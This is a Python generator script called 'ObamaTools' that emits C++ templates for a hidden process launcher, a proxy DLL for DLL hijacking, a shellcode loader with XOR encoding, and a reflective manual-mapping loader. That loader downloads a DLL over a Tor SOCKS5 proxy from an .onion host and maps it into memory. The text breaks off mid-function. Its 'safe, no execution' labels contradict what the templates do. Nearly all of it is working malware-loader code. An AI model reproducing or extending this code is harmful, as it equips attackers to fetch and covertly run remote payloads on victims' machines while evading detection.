import sys
import os
import pefile
import argparse
from Crypto.Hash import MD5
from Crypto.Cipher import AES
import random
from base64 import b64encode
from string import Template
import re

createLoader = False
createProxy = False
cppScriptPath = ""
ErrorSign = "\033[33m[!]\033[0m"
Success = "\033[32m[+]\033[0m"
Status = "\033[94m[*]\033[0m"
doBatstarter = False

def removeprefix(s: str, prefix: str) -> str:
    if s.startswith(prefix):
        return s[len(prefix):]
    return s

def replace_placeholder(dllTemplate, placeholder, template):
    pattern = rf"//\s*{placeholder}\s*ctx->arg\s*=\s*0;"
    return re.sub(pattern, template, dllTemplate)


usage = f"""
ObamaTools — Usage

General:
  ObamaTools.py [-h] [-d] [--process-starter [EXECUTABLE ...]]
                [--manual-mapper [-a] [dll_url mapper_func]]
                [--dll-loader dll_loader_dll dll_loader_func]
                [--proxy-dll proxy_dll_path proxy_exe proxy_main [proxy_args] [other_calls ...]]
                [--shellcode-loader shellcode_path master_key loader_cpp]

Modes:
  --process-starter [EXECUTABLE ...]
      Build a C++ starter that runs one or more .bat/.exe files hidden.
      Call main_func(const char* file, bool batmode = true, const char* exeArgs = nullptr, waitfor = false) in dll mode.

  --manual-mapper [-a]
      Prepare state for a manual mapping DLL template.
      With -a/--args: parameters (char* injecturl_one, char* inecturl_two, char* main_func_name) will be passed as arguments at runtime.
                                            |                        |
                                            |-> url stem             |-> url subpath
                                                (example.onion)          (/path)
      Without -a: expects dll_url and mapper_func positional parameters.

  --dll-loader
      Generate state for a small C++ program that LoadLibraryA’s a DLL
      and calls an exported function.
      Requires: dll_loader_dll dll_loader_func.

  --proxy-dll
      Generate state for a C++ proxy DLL that forwards exports to another DLL
      and additionally calls a user DLL.
      Positional arguments:
        proxy_dll_path   Original DLL to proxy.
        payload_dll        Target EXE path (used to derive output naming).
        payload_main       Export name to call in the payload DLL.
        payload_args       Optional: space-separated args for proxy_main.
        other_calls ...  Optional: extra “dll func [args]” triplets.

  --shellcode-loader
      Prepare state for a C++ shellcode loader source.
      Requires: shellcode_path master_key loader_cpp
      (output file name is derived internally).

Global flags:
  -d, --dll
      When used with process-starter or shellcode-loader, configure
      generation for a DLL-style entry (exported function) instead of EXE.

Notes:
  • This script only builds state and source templates; it does not execute payloads.
  • All paths should be valid Windows-style paths (quote if they contain spaces).
  • Compile instructions for generated .cpp files will be printed separately.

"""


startingbat = ""
createDllLoader = False
outputAsDLL = False
createMapper = False
createProxy = False

parser = argparse.ArgumentParser(
    description="Safe state builder (no execution)."
)

# Matches: -d / --dll
parser.add_argument("-d", "--dll", action="store_true")

# Matches: --process-starter …
parser.add_argument("--process-starter", action="store_true")
parser.add_argument("bat", nargs="*")

# Matches: --manual-mapper
parser.add_argument("--manual-mapper", action="store_true")

# Matches: -a / --args
parser.add_argument("-a", "--args", action="store_true")

# Manual mapper parameters
parser.add_argument("dll_url", nargs="?")
parser.add_argument("mapper_func", nargs="?")

# DLL loader
parser.add_argument("--dll-loader", action="store_true")
parser.add_argument("-i", "--input-dll")
parser.add_argument("-f", "--func")

# Proxy DLL
parser.add_argument("--proxy-dll", action="store_true")
parser.add_argument("-p", "--proxy-dll-path")
parser.add_argument("-l", "--load", type=str)
parser.add_argument("-o", "--other-calls", nargs="*", default=[], type=str)

# Shellcode loader
parser.add_argument("--shellcode-loader", action="store_true")
parser.add_argument("-s", "--shellcode-path")
parser.add_argument("-k", "--key")

args = parser.parse_args()

# ------------------------------------------------------
# Safe variable equivalents (no execution)
# ------------------------------------------------------
outputAsDLL = False
startingbat = ""
doBatstarter = False
createMapper = False
asArgs = False
DllUrl = None
DllMapperFuncName = None
DllLoaderDllPath = None
DllLoaderFuncName = None
mainFuncName = None
finalProxyName = None
createLoader = False
shellcodepath = None
masterKey = None
cppScriptPath = None

# ------------------------------------------------------
# Logic replication (state setting only)
# ------------------------------------------------------

if not (args.process_starter or args.manual_mapper or args.dll_loader
        or args.proxy_dll or args.shellcode_loader):
    print(usage)
    sys.exit(1)

# -d / --dll
if args.dll:
    outputAsDLL = True

# --process-starter
if args.process_starter:
    doBatstarter = True
    startingbat = "\n".join(args.bat).strip()
    if not startingbat:
        startingbat = "C:\\PLACEHOLDER.bat"

# --manual-mapper
if args.manual_mapper:

    if args.args:
        # -a mode: no extra positionals needed, but still a valid config
        asArgs = True
        createMapper = True
    else:
        # non -a mode: require dll_url and mapper_func
        if not (args.dll_url and args.mapper_func):
            print(usage)
            sys.exit(1)
        createMapper = True
        DllUrl = args.dll_url
        DllMapperFuncName = args.mapper_func

# --dll-loader
if args.dll_loader:
    if not (args.func and args.input_dll):
        print(usage)
        sys.exit(1)
    createDllLoader = True
    createProxy = False
    DllLoaderDllPath = args.input_dll
    DllLoaderFuncName = args.func

mainFuncArgs = []

# --proxy-dll
if args.proxy_dll:
    if not args.load:
       print(usage)
       sys.exit(1) 
    if not (len(args.load) >= 2):
        print(usage)
        sys.exit(1)

    if args.load:
        proxy_first = args.load.split(" ")
        if len(proxy_first) >= 2:
            createProxy = True
            dllPath = args.proxy_dll_path
            mainFuncName = proxy_first[1]
            exepath = proxy_first[0]
            finalProxyName = "./proxy_dll.cpp"
        if len(proxy_first) >= 3:
            proxy_first.pop(0)
            proxy_first.pop(0)
            mainFuncArgs = proxy_first
            print(mainFuncArgs)

    otherCalls = args.other_calls or []
    for i in otherCalls:
        i = i.split(" ")


# --shellcode-loader
if args.shellcode_loader:
    # Validate required params
    if not args.shellcode_path or not args.key:
        print("Usage: --shellcode-loader -s <shellcode_path> -k <key>")
        sys.exit(1)

    createLoader = True
    createProxy = False
    shellcodepath = args.shellcode_path
    masterKey = args.key
    cppScriptPath = "./shellcode_loader.cpp"
    loaderName = "ShellCodeLoader - COMPILE TO EXE.cpp"



# Example usage:
# final_state = build_state_from_args()
# (no printing, no execution)





def xor(data, key):
    l = len(key)
    keyAsInt = list(map(ord, key))
    return bytes(bytearray(
        (data[i] ^ keyAsInt[i % l] for i in range(0, len(data)))
    ))


def formatCPP(data, key, cipherType):
    shellcode = "\\x"
    shellcode += "\\x".join(format(b, '02x') for b in data)

    chunk_size = 16 * 4  # 16 bytes each line * 4 chars/byte (including \x)

    lines = [shellcode[i:i + chunk_size] for i in range(0, len(shellcode), chunk_size)]
    shellcode = "\""
    shellcode += "\"\n\"".join(lines) + "\""
    return shellcode


dllLoaderTemplate = """#include <windows.h>
#include <iostream>

typedef BOOL (WINAPI* MainFuncType)();   // no parameters now

int main()
{
    const char* dllPath = "DLL_PATH";

    HMODULE hMod = LoadLibraryA(dllPath);
    if (!hMod) {
        std::cout << "LoadLibrary failed: " << GetLastError() << "\\n";
        return 1;
    }

    std::cout << "DLL loaded at: 0x" << std::hex << (uintptr_t)hMod << std::dec << "\\n";

    FARPROC proc = GetProcAddress(hMod, "MAIN_FUNC_NAME");
    if (!proc) {
        std::cout << "GetProcAddress failed: " << GetLastError() << "\\n";
        FreeLibrary(hMod);
        return 1;
    }

    MainFuncType main_func = reinterpret_cast<MainFuncType>(proc);

    std::cout << "Calling main_func()...\\n";

    BOOL result = main_func();

    std::cout << "main_func returned: " << result << "\\n";

    FreeLibrary(hMod);
    return 0;
}
"""

batstarter = """
#include <windows.h>
#include <string>
#include <vector>

//compile with: cl /std:c++17 /EHsc batstarter.cpp /link user32.lib myicon.res

bool start_process(const char* file, bool batmode = true, const char* exeArgs = nullptr, bool waitfor = false)
{
    auto expandVars = [](const char* input) -> std::string {
        if (!input) return "";
        DWORD need = ExpandEnvironmentStringsA(input, nullptr, 0);
        if (!need) return "";
        std::vector<char> buf(need);
        ExpandEnvironmentStringsA(input, buf.data(), need);
        return std::string(buf.data());
    };

    // Expand script / exe path
    std::string scriptPath = expandVars(file);
    if (scriptPath.empty())
        return false;

    std::vector<char> cmdMutableData;
    char* cmdPtr = nullptr;

    if (batmode) {
        // FIX #7: expand arguments
        std::string args = expandVars(exeArgs);

        // FIX #3: proper closing quote
        std::string cmdLine = "/C \\"\\"" + scriptPath + "\\"";

        if (!args.empty()) {
            cmdLine += " ";
            cmdLine += args;
        }

        cmdLine += "\\"";  // <-- critical closing quote

        cmdMutableData.assign(cmdLine.begin(), cmdLine.end());
        cmdMutableData.push_back('\\0');
        cmdPtr = cmdMutableData.data();
    }
    else {
        std::string args = expandVars(exeArgs);

        std::string cmdLine = "\\"" + scriptPath + "\\"";
        if (!args.empty()) {
            cmdLine += " ";
            cmdLine += args;
        }

        cmdMutableData.assign(cmdLine.begin(), cmdLine.end());
        cmdMutableData.push_back('\\0');
        cmdPtr = cmdMutableData.data();
    }

    const char* processName =
        batmode ? "C:\\\\Windows\\\\System32\\\\cmd.exe" : scriptPath.c_str();

    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);

    BOOL ok = CreateProcessA(
        nullptr,
        cmdPtr,
        nullptr,
        nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si,
        &pi
    );

    if (!ok)
        return false;

    if (waitfor)
        WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    //STARTING_BAT
    return 0;
}
"""

batstarterDLL = """
#include <windows.h>
#include <string>
#include <vector>

//compile with: cl /LD /std:c++17 /EHsc batstarter.cpp /link user32.lib myicon.res

extern "C" __declspec(dllexport) bool main_func(const char* file, bool bat = true, const char* exeArgs = nullptr)
{
    // Expand environment variables

    auto expandVars = [](const char* input) -> std::string {
        if (!input) return "";
        DWORD need = ExpandEnvironmentStringsA(input, nullptr, 0);
        if (!need) return "";
        std::vector<char> buf(need);
        ExpandEnvironmentStringsA(input, buf.data(), need);
        return std::string(buf.data());
    };


    DWORD needed = ExpandEnvironmentStringsA(file, nullptr, 0);
    if (!needed) return false;

    std::vector<char> expanded(needed);
    if (!ExpandEnvironmentStringsA(file, expanded.data(), needed))
        return false;

    std::string scriptPath = expanded.data();

    // ---- Build command line ----
    std::vector<char> cmdMutableData;
    char* cmdPtr = nullptr;

    if (bat) {
        // Batch command with output redirection
        std::string cmdLine =
            std::string("/C \\"") + scriptPath;

        cmdMutableData.assign(cmdLine.begin(), cmdLine.end());
        cmdMutableData.push_back('\\0');

        cmdPtr = cmdMutableData.data();
    } 
   else {
    // ---- Build command line for EXE ----
        std::string cmdLine;

        // Expand args
        std::string args = expandVars(exeArgs);

        // EXE name must be first
        cmdLine = "\\"" + scriptPath + "\\"";

        if (!args.empty()) {
            cmdLine += " ";
            cmdLine += args;
        }

        cmdMutableData.assign(cmdLine.begin(), cmdLine.end());
        cmdMutableData.push_back('\\0');

        cmdPtr = cmdMutableData.data();
    }

    // ---- Select process name ----
    std::string processName;

    if (bat)
        processName = "C:\\\\Windows\\\\System32\\\\cmd.exe";
    else
        processName = scriptPath;  // Launch EXE directly

    // ---- Create process ----
    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);

    BOOL ok = CreateProcessA(
        processName.c_str(),        // Application name
        cmdPtr,                     // Command line (mutable buffer)
        nullptr, nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si, &pi);

    if (!ok) {
        return false;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

BOOL APIENTRY DllMain(HMODULE hModuleCall,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
"""

argsTempl = """#include <winsock2.h>     // MUST be first before windows.h
#include <ws2tcpip.h>     // optional, for inet_pton, getaddrinfo, etc.
#include <windows.h>      // main Windows API
#include <string>
#include <vector>
#include <algorithm>      // for std::search
#include <fstream>

#pragma comment(lib, "ws2_32.lib")

static unsigned char* dllcode = nullptr;
static size_t dllsize = 0;


bool download_through_socks5(const char* proxy_ip, int proxy_port,
    const char* host, int port,
    const char* path)
{
    WSADATA w{};
    if (WSAStartup(MAKEWORD(2, 2), &w) != 0) return false;

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) { WSACleanup(); return false; }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((unsigned short)proxy_port);
    if (inet_pton(AF_INET, proxy_ip, &addr.sin_addr) != 1) {
        closesocket(s); WSACleanup(); return false;
    }

    if (connect(s, (sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(s); WSACleanup(); return false;
    }

    // SOCKS5 greeting (no auth)
    unsigned char greet[3] = { 0x05, 0x01, 0x00 };
    if (send(s, (const char*)greet, 3, 0) != 3) { closesocket(s); WSACleanup(); return false; }

    unsigned char resp[2] = { 0 };
    if (recv(s, (char*)resp, 2, 0) != 2) { closesocket(s); WSACleanup(); return false; }
    if (resp[1] != 0x00) { closesocket(s); WSACleanup(); return false; }

    // Build CONNECT request (domain)
    std::string hostStr(host);
    std::vector<unsigned char> req;
    req.push_back(0x05); // ver
    req.push_back(0x01); // CONNECT
    req.push_back(0x00); // rsv
    req.push_back(0x03); // domain
    req.push_back((unsigned char)hostStr.size());
    req.insert(req.end(), hostStr.begin(), hostStr.end());
    req.push_back((unsigned char)((port >> 8) & 0xFF));
    req.push_back((unsigned char)(port & 0xFF));

    if (send(s, (const char*)req.data(), (int)req.size(), 0) != (int)req.size()) { closesocket(s); WSACleanup(); return false; }

    unsigned char reply[10];
    if (recv(s, (char*)reply, (int)sizeof(reply), 0) <= 1) { closesocket(s); WSACleanup(); return false; }
    if (reply[1] != 0x00) { closesocket(s); WSACleanup(); return false; }

    // HTTP GET through tunnel
    std::string http = std::string("GET ") + path + " HTTP/1.1\\r\\nHost: " + hostStr + "\\r\\nConnection: close\\r\\n\\r\\n";
    if (send(s, http.c_str(), (int)http.size(), 0) != (int)http.size()) { closesocket(s); WSACleanup(); return false; }

    // Read all
    std::vector<unsigned char> data;
    unsigned char buf[4096];
    int r;
    while ((r = recv(s, (char*)buf, sizeof(buf), 0)) > 0) {
        data.insert(data.end(), buf, buf + r);
    }

    closesocket(s);
    WSACleanup();

    // Find header/body separator
    const std::string hdr = "\\r\\n\\r\\n";
    auto it = std::search(data.begin(), data.end(), hdr.begin(), hdr.end());
    if (it == data.end()) return false;

    size_t headerSize = (it - data.begin()) + hdr.size();
    size_t bodySize = data.size() - headerSize;

    // allocate static buffer
    dllsize = bodySize;
    dllcode = new unsigned char[dllsize];
    memcpy(dllcode, data.data() + headerSize, dllsize);

    return true;
}

HANDLE threadhandle;

extern "C" __declspec(dllexport) int WINAPI stop() {
    TerminateThread(threadhandle, 0);
    return 0;
}

extern "C" __declspec(dllexport) int WINAPI resume() {
    ResumeThread(threadhandle);
    return 0;
}

extern "C" __declspec(dllexport) int WINAPI suspend() {
    SuspendThread(threadhandle);
    return 0;
}


extern "C" __declspec(dllexport) int WINAPI main_func(char* injecturl_one, char* inecturl_two, char* main_func_name) {
    if (download_through_socks5("127.0.0.1", 9050, injecturl_one, 80, inecturl_two))
    {
        
    }
    else
    {
        
    }

    // Point hModule at the raw dll bytes so the loader will treat the blob as the "original image".
    HMODULE hModule = (HMODULE)dllcode;
    const SIZE_T dllBlobSize = dllsize;

    if (hModule == NULL) {
        return FALSE;
    }

    // Parse DOS/NT headers from the on-disk image (raw blob) to obtain sizes for allocation.
    PIMAGE_DOS_HEADER pDosHeaderOrig = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeaderOrig->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }
    PIMAGE_NT_HEADERS64 pNtHeadersOrig = (PIMAGE_NT_HEADERS64)((BYTE*)hModule + pDosHeaderOrig->e_lfanew);
    if (pNtHeadersOrig->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }
    BOOL is64BitOrig = (pNtHeadersOrig->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC);
    if (!is64BitOrig) {
        return FALSE;
    }

    // Use orig headers only to allocate memory.
    SIZE_T imageSizeAlloc = (SIZE_T)pNtHeadersOrig->OptionalHeader.SizeOfImage;
    LPVOID preferredBaseAlloc = (LPVOID)(ULONG_PTR)pNtHeadersOrig->OptionalHeader.ImageBase;

    // Allocate memory for the image (same as before)
    LPVOID mem = VirtualAlloc(preferredBaseAlloc, imageSizeAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    BOOL usedPreferredBase = TRUE;
    if (mem == NULL) {
        mem = VirtualAlloc(NULL, imageSizeAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        usedPreferredBase = FALSE;
    }
    if (mem == NULL) {
        return FALSE; // allocation failed
    }

    // Copy headers (from original image in memory)
    SIZE_T headersSize = pNtHeadersOrig->OptionalHeader.SizeOfHeaders;
    memcpy(mem, hModule, headersSize);

    // Re-parse headers from the copied image (mem) and use these for all further validation/operations.
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)mem;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return FALSE;
    }
    PIMAGE_NT_HEADERS64 pNtHeaders = (PIMAGE_NT_HEADERS64)((BYTE*)mem + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return FALSE;
    }
    if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return FALSE;
    }

    SIZE_T imageSize = (SIZE_T)pNtHeaders->OptionalHeader.SizeOfImage;
    DWORD entryPointRVA = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    IMAGE_DATA_DIRECTORY* dataDir = pNtHeaders->OptionalHeader.DataDirectory;

    // Helper to validate that a pointer/region resides entirely inside the copied image.
    auto in_image = [&](BYTE* p, SIZE_T sz = 1)->bool {
        if (!mem) return false;
        BYTE* base = (BYTE*)mem;
        BYTE* end = base + imageSize;
        if (p < base) return false;
        if (sz == 0) return (p <= end);
        // check overflow
        if (p + (sz - 1) < p) return false;
        return (p + sz) <= end;
        };

    // Section table from the copied image
    WORD numSections = pNtHeaders->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(pNtHeaders);

    // original image bounds (as observed in the process where the loader runs)
    BYTE* origBase = (BYTE*)hModule;               // points into the raw blob (file layout)
    SIZE_T origImageSize = (SIZE_T)pNtHeadersOrig->OptionalHeader.SizeOfImage; // virtual size requested
    BYTE* origEnd = origBase + origImageSize;     // not safe for file-layout blobs
    // raw blob end is the actual buffer length
    BYTE* origBlobEnd = origBase + dllBlobSize;

    // Decide if the downloaded blob is a file-image (raw on-disk) or an in-memory mapped image
    // If the raw blob is smaller than the reported SizeOfImage it's almost certainly a file-layout blob.
    bool blobLooksLikeFileLayout = (dllBlobSize < origImageSize);
    if (blobLooksLikeFileLayout) {

    }
    else {

    }

    // Copy sections: when we have a file-layout blob, use PointerToRawData as source; otherwise prefer VA-located data.
    for (WORD i = 0; i < numSections; ++i) {
        DWORD virtRVA = sections[i].VirtualAddress;
        DWORD rawSize = sections[i].SizeOfRawData;
        DWORD virtSize = sections[i].Misc.VirtualSize;
        DWORD pointerToRaw = sections[i].PointerToRawData;
        BYTE* dest = (BYTE*)mem + virtRVA;

        // Validate dest region fits in allocated image
        if (!in_image(dest, virtSize)) {
            char dbg[128];
            _snprintf_s(dbg, sizeof(dbg), _TRUNCATE, "Section %u destination out-of-bounds: dest=%p virtSize=0x%X", i, dest, virtSize);
            continue;
        }

        SIZE_T copySize = (virtSize < rawSize) ? (SIZE_T)virtSize : (SIZE_T)rawSize;

        BYTE* srcFromVA = origBase + virtRVA;            // candidate if blob is mapped image
        BYTE* srcFromRaw = origBase + pointerToRaw;      // candidate if blob is file/image on disk

        bool copied = false;

        if (blobLooksLikeFileLayout) {
            // prefer raw PointerToRawData source when the blob is file-layout
            if (pointerToRaw != 0 && pointerToRaw + copySize <= dllBlobSize) {
                memcpy(dest, srcFromRaw, copySize);
                copied = true;
            }
            else {
                // fallback: if VA-based source is inside blob (rare) use it
                if ((srcFromVA >= origBase) && ((srcFromVA + copySize) <= origBlobEnd)) {
                    memcpy(dest, srcFromVA, copySize);
                    copied = true;
                }
            }
        }
        else {
            // blob likely mapped image: prefer VA data
            if ((srcFromVA >= origBase) && ((srcFromVA + copySize) <= origBlobEnd)) {
                memcpy(dest, srcFromVA, copySize);
                copied = true;
            }
            else if (pointerToRaw != 0 && (pointerToRaw + copySize) <= dllBlobSize) {
                memcpy(dest, srcFromRaw, copySize);
                copied = true;
            }
        }

        if (!copied && copySize > 0) {
            // no valid source inside blob -> zero out raw area (safe fallback)
            memset(dest, 0, copySize);
        }

        // Zero any remaining virtual bytes
        if (virtSize > copySize) {
            memset(dest + copySize, 0, virtSize - copySize);
        }

        // Debug info for each section copy
        char dbg[256];
        _snprintf_s(dbg, sizeof(dbg), _TRUNCATE,
            "Section %u: VA=0x%08X Raw=0x%X Virt=0x%X PtrToRaw=0x%08X copied=%d copySize=0x%Ix",
            i, virtRVA, rawSize, virtSize, pointerToRaw, (int)copied, copySize);
    }

    // Continue with relocations/imports/exports as before (not fully changed here)
    INT64 offsetDelta = (INT64)((BYTE*)mem - (BYTE*)preferredBaseAlloc);

    // Relocations
    if (!usedPreferredBase) {
        if (dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 &&
            dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size != 0)
        {
            BYTE* relocBase = (BYTE*)mem + dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
            DWORD relocSize = dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
            if (in_image(relocBase, relocSize)) {
                BYTE* relocEnd = relocBase + relocSize;
                while (relocBase < relocEnd) {
                    if (!in_image(relocBase, sizeof(IMAGE_BASE_RELOCATION))) break;
                    IMAGE_BASE_RELOCATION* block = (IMAGE_BASE_RELOCATION*)relocBase;
                    DWORD pageRVA = block->VirtualAddress;
                    DWORD blockSize = block->SizeOfBlock;
                    if (blockSize < sizeof(IMAGE_BASE_RELOCATION)) break;
                    BYTE* entriesBase = relocBase + sizeof(IMAGE_BASE_RELOCATION);
                    DWORD entriesBytes = blockSize - sizeof(IMAGE_BASE_RELOCATION);
                    if (!in_image(entriesBase, entriesBytes)) break;
                    WORD* entries = (WORD*)(entriesBase);
                    size_t entryCount = entriesBytes / sizeof(WORD);
                    for (size_t i = 0; i < entryCount; ++i) {
                        WORD entry = entries[i];
                        WORD type = entry >> 12;
                        WORD offset = entry & 0x0FFF;
                        BYTE* target = (BYTE*)mem + pageRVA + offset;
                        if (!in_image(target, (type == IMAGE_REL_BASED_DIR64) ? sizeof(INT64) : sizeof(DWORD))) {
                            continue; // skip out-of-bounds reloc
                        }
                        if (type == IMAGE_REL_BASED_HIGHLOW) {
                            continue;
                        }
                        else if (type == IMAGE_REL_BASED_DIR64) {
                            INT64* p = (INT64*)target;
                            *p += offsetDelta;
                        }
                    }
                    relocBase += blockSize;
                }
            }
        }
    }

    using MainFuncType = DWORD(WINAPI*)(LPVOID lpParameter);
    MainFuncType main_func = nullptr;

    // Export table handling (same as prior code - keep bounds checking)
    if (dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0 &&
        dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].Size != 0)
    {
        IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)mem + dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        if (in_image((BYTE*)exp, sizeof(IMAGE_EXPORT_DIRECTORY))) {
            DWORD numberOfNames = exp->NumberOfNames;
            DWORD numberOfFunctions = exp->NumberOfFunctions;
            DWORD exportDirSize = dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

            char dbg2[256];
            _snprintf_s(dbg2, sizeof(dbg2), _TRUNCATE,
                "ExportDir AddrOfFunctions=0x%X DirSize=0x%X #Names=%u #Funcs=%u",
                exp->AddressOfFunctions, exportDirSize, exp->NumberOfNames, exp->NumberOfFunctions);

            DWORD* funcRVAs = nullptr;
            DWORD* nameRVAs = nullptr;
            WORD* ords = nullptr;

            if (exp->AddressOfFunctions != 0) funcRVAs = (DWORD*)((BYTE*)mem + exp->AddressOfFunctions);
            if (exp->AddressOfNames != 0) nameRVAs = (DWORD*)((BYTE*)mem + exp->AddressOfNames);
            if (exp->AddressOfNameOrdinals != 0) ords = (WORD*)((BYTE*)mem + exp->AddressOfNameOrdinals);

            bool arrays_ok = true;
            if (funcRVAs == nullptr || nameRVAs == nullptr || ords == nullptr) arrays_ok = false;
            else {
                if (!in_image((BYTE*)funcRVAs, sizeof(DWORD) * (size_t)numberOfFunctions)) arrays_ok = false;
                if (!in_image((BYTE*)nameRVAs, sizeof(DWORD) * (size_t)numberOfNames)) arrays_ok = false;
                if (!in_image((BYTE*)ords, sizeof(WORD) * (size_t)numberOfNames)) arrays_ok = false;
            }

            if (arrays_ok) {
                char dbg[256];
                for (DWORD i = 0; i < numberOfNames; ++i) {
                    DWORD nameRVA = nameRVAs[i];
                    if (!in_image((BYTE*)mem + nameRVA, 1)) continue;
                    BYTE* namePtr = (BYTE*)mem + nameRVA;
                    size_t maxLen = (BYTE*)mem + imageSize - namePtr;
                    std::string nameStr((const char*)namePtr, strnlen_s((const char*)namePtr, maxLen));
                    _snprintf_s(dbg, sizeof(dbg), _TRUNCATE, "Export #%u name: '%s'", i, nameStr.c_str());

                    if (nameStr == main_func_name) {
                        WORD funcIndex = ords[i];
                        _snprintf_s(dbg, sizeof(dbg), _TRUNCATE, "funcIndex=%u (must be < %u)", funcIndex, numberOfFunctions);
                        if (funcIndex >= numberOfFunctions) {
                            continue;
                        }
                        DWORD funcRVA = funcRVAs[funcIndex];
                        BYTE* funcVA = (BYTE*)mem + funcRVA;
                        _snprintf_s(dbg, sizeof(dbg), _TRUNCATE, "funcRVA=0x%08X funcVA=%p in_image=%d", funcRVA, funcVA, in_image(funcVA, 1));
                        if (!in_image(funcVA, 1)) { continue; }

                        main_func = (MainFuncType)(funcVA);
                    }
                }
            }
            else {
            }
        }
    }

    // (imports, protections, entry point call etc. unchanged from earlier sample)

    // Resolve imports safely: validate import directory and all computed pointers
    if (dataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress != 0 &&
        dataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].Size != 0)
    {
        BYTE* importBase = (BYTE*)mem + dataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        DWORD importSize = dataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
        if (in_image(importBase, 1) && in_image(importBase, importSize)) {
            IMAGE_IMPORT_DESCRIPTOR* impDesc = (IMAGE_IMPORT_DESCRIPTOR*)importBase;
            // iterate descriptors until a null descriptor or out-of-bounds
            while (in_image((BYTE*)impDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR)) && impDesc->Name != 0) {
                // validate dll name pointer
                BYTE* dllNamePtr = (BYTE*)mem + impDesc->Name;
                if (!in_image(dllNamePtr, 1)) {
                    ++impDesc;
                    continue;
                }
                const char* dllName = (const char*)dllNamePtr;
                HMODULE hMod = LoadLibraryA(dllName);
                if (!hMod) {
                    // skip unresolved library but continue processing remaining descriptors
                    ++impDesc;
                    continue;
                }

                // Use OriginalFirstThunk if present, otherwise fall back to FirstThunk
                DWORD origRVA = impDesc->OriginalFirstThunk;
                DWORD iatRVA = impDesc->FirstThunk;
                if (iatRVA == 0) { ++impDesc; continue; } // nothing to do

                IMAGE_THUNK_DATA64* origThunk = (IMAGE_THUNK_DATA64*)((BYTE*)mem + (origRVA ? origRVA : iatRVA));
                IMAGE_THUNK_DATA64* iatThunk = (IMAGE_THUNK_DATA64*)((BYTE*)mem + iatRVA);

                // Validate thunk pointers lie inside the image
                if (!in_image((BYTE*)origThunk, sizeof(IMAGE_THUNK_DATA64)) ||
                    !in_image((BYTE*)iatThunk, sizeof(IMAGE_THUNK_DATA64)))
                {
                    ++impDesc;
                    continue;
                }

                // Iterate thunk entries with bounds checks
                while (in_image((BYTE*)origThunk, sizeof(IMAGE_THUNK_DATA64)) &&
                    in_image((BYTE*)iatThunk, sizeof(IMAGE_THUNK_DATA64)) &&
                    origThunk->u1.AddressOfData != 0)
                {
                    FARPROC func = nullptr;
                    if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                        WORD ord = (WORD)(origThunk->u1.Ordinal & 0xFFFF);
                        func = GetProcAddress(hMod, (LPCSTR)(uintptr_t)ord);
                    }
                    else {
                        // IMAGE_IMPORT_BY_NAME structure
                        IMAGE_IMPORT_BY_NAME* ibn = (IMAGE_IMPORT_BY_NAME*)((BYTE*)mem + origThunk->u1.AddressOfData);
                        if (!in_image((BYTE*)ibn, sizeof(WORD) + 1) || !in_image((BYTE*)ibn->Name, 1)) {
                            // invalid or truncated import by name; stop this thunk chain
                            break;
                        }
                        // Ensure the name is null-terminated before passing to GetProcAddress.
                        // We can't easily know the full length safely, so check that the start is inside the image.
                        func = GetProcAddress(hMod, (LPCSTR)ibn->Name);
                    }

                    // Only patch if func resolved
                    if (func) {
                        iatThunk->u1.Function = (ULONGLONG)func;
                    }
                    else {
                        // handle unresolved export (set to NULL)
